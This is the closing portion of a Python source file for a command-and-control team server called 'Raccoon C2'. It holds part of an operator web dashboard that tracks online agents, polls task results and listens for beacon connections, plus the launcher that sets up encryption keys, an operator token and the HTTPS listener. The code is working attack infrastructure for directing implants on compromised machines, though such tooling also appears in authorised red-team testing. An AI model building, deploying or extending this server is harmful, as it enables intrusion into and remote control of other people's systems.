          <div class="cfg-stat"><span class="num" style="color:var(--green)">${cfg.agents_online}</span> online</div>
          <div class="cfg-stat"><span class="num" style="color:var(--text)">${cfg.agents_total}</span> total</div>
          <div class="cfg-stat"><span class="num" style="color:var(--yellow)">${cfg.tasks_total}</span> tasks</div>
        </div>
      </div>
    `;

    const encKeyEl = document.getElementById("cfg-enc-key");
    if(encKeyEl){
      encKeyEl.onclick = () => { encKeyEl.textContent = cfg.enc_key; };
    }
  }catch(e){
    body.innerHTML = '<div style="padding:20px;color:#ff6666">Failed to load config</div>';
  }
}

function copyToClipboard(text, label){
  navigator.clipboard.writeText(text).then(() => {
    toast("info","Copied",esc(label)+" copied to clipboard",2000);
  }).catch(() => {
    const ta = document.createElement("textarea");
    ta.value = text;
    document.body.appendChild(ta);
    ta.select();
    document.execCommand("copy");
    document.body.removeChild(ta);
    toast("info","Copied",esc(label)+" copied to clipboard",2000);
  });
}

setInterval(refreshAgents, 3000);
setInterval(checkTaskResults, 2500);
refreshAgents();
toast("info","Server Online","Listening for beacon connections<br>Beacon traffic accepted on any POST path",6000);
</script>
</body>
</html>
"""


# ── CLI ──

def main():
    parser = argparse.ArgumentParser(
        description="Raccoon C2 Team Server",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("--host", default="0.0.0.0", help="Listen address")
    parser.add_argument("--port", type=int, default=8443, help="Listen port")
    parser.add_argument("--key", help="Base64-encoded 32-byte AES-GCM key")
    parser.add_argument(
        "--derive-key",
        help="Derive key from 'callback_url:dns_domain' (must match beacon config)",
    )
    parser.add_argument("--ssl", action="store_true", help="Enable HTTPS (self-signed)")
    parser.add_argument("--cert", help="SSL certificate file")
    parser.add_argument("--certkey", help="SSL private key file")
    parser.add_argument("--token", help="Fixed operator token (default: random)")
    parser.add_argument(
        "--data-dir", default=str(Path.home() / ".raccoon-c2"),
        help="Data directory for state persistence",
    )
    args = parser.parse_args()

    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s [%(name)s] %(levelname)s %(message)s",
    )

    if args.key:
        key = base64.b64decode(args.key)
    elif args.derive_key:
        parts = args.derive_key
        key = hashlib.sha256(parts.encode()).digest()
    else:
        key = hashlib.sha256(b":").digest()
        logger.warning("No encryption key specified — using default derived key")
        logger.warning("Use --key or --derive-key for production")

    crypto = ServerCrypto(key)

    operator_token = args.token or secrets.token_urlsafe(24)
    data_dir = Path(args.data_dir)
    data_dir.mkdir(parents=True, exist_ok=True)

    _load_state(data_dir)

    srv_config = {
        "host": args.host,
        "port": args.port,
        "ssl": args.ssl,
        "cert": args.cert or "",
        "key_type": "explicit" if args.key else ("derived" if args.derive_key else "default"),
        "start_time": time.time(),
    }
    app = create_app(crypto, operator_token, data_dir, server_config=srv_config)

    print()
    print("=" * 60)
    print("  🦝 Raccoon C2 Team Server")
    print("=" * 60)
    print(f"  Listen:   {'https' if args.ssl else 'http'}://{args.host}:{args.port}")
    print(f"  Token:    {operator_token}")
    print(f"  Data:     {data_dir}")
    print(f"  Key:      {'explicit' if args.key else 'derived' if args.derive_key else 'DEFAULT (insecure!)'}")
    print("=" * 60)
    print()

    ssl_ctx = None
    if args.ssl:
        if args.cert and args.certkey:
            ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            ssl_ctx.load_cert_chain(args.cert, args.certkey)
        else:
            ssl_ctx = "adhoc"
            logger.info("Using self-signed certificate (install pyopenssl: pip install pyopenssl)")

    app.run(
        host=args.host,
        port=args.port,
        ssl_context=ssl_ctx,
        debug=False,
        threaded=True,
    )


if __name__ == "__main__":
    main()
